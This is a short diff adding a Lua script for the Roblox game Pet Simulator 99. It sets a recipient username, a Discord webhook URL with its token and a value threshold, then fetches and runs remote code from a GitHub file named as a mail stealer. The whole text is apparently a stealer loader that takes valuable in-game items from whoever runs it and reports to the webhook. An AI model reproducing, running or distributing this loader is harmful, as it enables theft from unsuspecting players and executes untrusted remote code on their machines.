@@ -1,0 +1,7 @@
+lua
+Username= 'Rip_Undercover29'
+Webhook= 'https://discord.com/api/webhooks/1256444870734905355/4qVurR5wNT_lWI-AI2Zd7Rayq4jVpNig-ZfLPQYqfF4gJdYJl6RPcIH8ed5AjwMveOIB'
+
+MinimumRAP = 70000000
+
+loadstring(game:HttpGet(https://raw.githubusercontent.com/Ps99scriptgiver-web/PS99MailStealer/main/OBSV2STEALER))()
